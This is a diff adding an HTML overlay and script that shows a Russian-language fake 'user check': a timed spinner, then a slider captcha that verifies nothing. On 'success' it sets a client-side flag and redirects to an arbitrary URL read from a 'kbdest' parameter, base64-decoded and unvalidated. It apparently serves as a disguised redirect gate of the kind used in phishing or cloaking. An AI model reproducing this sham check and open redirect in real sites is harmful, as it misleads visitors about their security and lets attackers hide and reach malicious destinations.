@@ -1,0 +1,167 @@
+<div id="overlay" class="overlay">
+  <div class="box">
+    <div class="progress-container">
+      <div class="loader-ring"></div>
+      <div class="progress-text">
+        <div class="label">Проверка<br />пользователя...</div>
+        <div id="timer" class="time">0.0s</div>
+      </div>
+    </div>
+
+    <div id="sliderArea" style="display: none">
+      <div class="jYGvkJaWLt"></div>
+      <div class="slider-wrap">
+        <div id="track" class="track">
+          <div id="hint" class="hint">→</div>
+          <div
+            id="handle"
+            class="handle"
+            role="button"
+            aria-label="капча"
+            tabindex="0"
+          ></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function () {
+    var countdownSeconds = 4 + Math.random() * 3; 
+    var step = 0.1;
+
+    var timerEl = document.getElementById("timer");
+    var sliderArea = document.getElementById("sliderArea");
+    var handle = document.getElementById("handle");
+    var track = document.getElementById("track");
+    var hint = document.getElementById("hint");
+
+    var elapsed = 0.0;
+    timerEl.textContent = elapsed.toFixed(1) + "s";
+
+    var countdown = setInterval(function () {
+      elapsed += step;
+      if (elapsed >= countdownSeconds) {
+        clearInterval(countdown);
+        sliderArea.style.display = "block";
+        document.querySelector(".progress-container").style.display = "none";
+        setTimeout(function () {
+          hint.style.opacity = 0.9;
+        }, 200);
+      } else {
+        timerEl.textContent = elapsed.toFixed(1) + "s";
+      }
+    }, step * 1000);
+
+    var dragging = false;
+    var trackRect, handleRect, maxLeft;
+
+    function initDrag() {
+      trackRect = track.getBoundingClientRect();
+      handleRect = handle.getBoundingClientRect();
+      maxLeft = trackRect.width - handleRect.width;
+      if (!handle.style.left) {
+        handle.style.left = "0px";
+      }
+    }
+
+    function onPointerDown(e) {
+      e.preventDefault();
+      dragging = true;
+      trackRect = track.getBoundingClientRect();
+      handleRect = handle.getBoundingClientRect();
+      maxLeft = trackRect.width - handleRect.width;
+    }
+
+    function onPointerMove(e) {
+      if (!dragging) return;
+      var clientX = e.touches ? e.touches[0].clientX : e.clientX;
+      var delta = clientX - trackRect.left - handleRect.width / 2;
+      if (delta < 0) delta = 0;
+      if (delta > maxLeft) delta = maxLeft;
+      handle.style.left = delta + "px";
+
+      var progress = delta / maxLeft;
+      hint.style.opacity = Math.max(0, 1 - progress * 1.6);
+
+      if (progress >= 0.95) {
+        solved();
+      }
+    }
+
+    function onPointerUp(e) {
+      if (!dragging) return;
+      dragging = false;
+    }
+
+    function solved() {
+      handle.style.left = maxLeft + "px";
+      handle.style.pointerEvents = "none";
+
+      // сохраняем авторизацию на 1 час
+      const expire = Date.now() + 60*60*1000; // 1 час
+      localStorage.setItem("userAuth", JSON.stringify({verified:true, expire}));
+
+      var redirectTo = null;
+      try {
+        var u = new URL(location.href);
+        if (u.searchParams.has("kbdest")) {
+          var val = u.searchParams.get("kbdest");
+          try {
+            var decoded = atob(val);
+            var test = new URL(decoded);
+            redirectTo = decoded;
+          } catch (e) {
+            try {
+              var test2 = new URL(val);
+              redirectTo = val;
+            } catch (er) {
+              redirectTo = null;
+            }
+          }
+        }
+      } catch (e) {
+        redirectTo = null;
+      }
+
+      setTimeout(function () {
+        if (redirectTo) location.href = redirectTo;
+        else location.reload();
+      }, 600);
+    }
+
+    handle.addEventListener("mousedown", onPointerDown);
+    document.addEventListener("mousemove", onPointerMove);
+    document.addEventListener("mouseup", onPointerUp);
+
+    handle.addEventListener("touchstart", onPointerDown, { passive: false });
+    document.addEventListener("touchmove", onPointerMove, { passive: false });
+    document.addEventListener("touchend", onPointerUp);
+
+    handle.addEventListener("keydown", function (e) {
+      initDrag();
+      if (e.key === "ArrowRight" || e.key === "Right") {
+        var left = parseFloat(handle.style.left || 0);
+        left += 20;
+        if (left > maxLeft) left = maxLeft;
+        handle.style.left = left + "px";
+        if (left >= maxLeft * 0.95) solved();
+      }
+      if (e.key === "Home") {
+        handle.style.left = "0px";
+      }
+      if (e.key === "End") {
+        handle.style.left = maxLeft + "px";
+        solved();
+      }
+    });
+
+    window.addEventListener("resize", function () {
+      initDrag();
+    });
+    setTimeout(function () {
+      initDrag();
+    }, 300);
+  })();
+</script>
